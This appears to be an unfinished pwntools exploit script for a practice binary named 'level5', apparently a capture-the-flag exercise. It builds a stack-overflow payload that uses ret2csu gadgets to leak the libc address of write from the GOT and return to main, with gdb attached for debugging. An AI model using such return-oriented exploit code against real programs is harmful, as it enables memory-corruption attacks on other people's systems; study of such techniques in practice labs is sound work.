from pwn import *
from pwnlib.util.misc import write
context.arch = "amd64"
context.log_level = "debug"
p = process("./level5")
e = ELF("./level5")
libc = ELF("libc.so")
init_add = 0x40061a
init2_add = 0x400600
write_got = e.got["write"]
main_add = e.sym["main"]
payload = flat(["A" * 0x80 , "A" * 8 , init_add , 0 , 1 , write_got , 8 , write_got , 1 , init2_add , "A" * (8 * 7) , main_add])
"""
pop     rbx 0 
pop     rbp 1
pop     r12 write_got
pop     r13 8
pop     r14 write_got
pop     r15 1
retn 0x400600
"""
gdb.attach(p,"b *0x40064a")
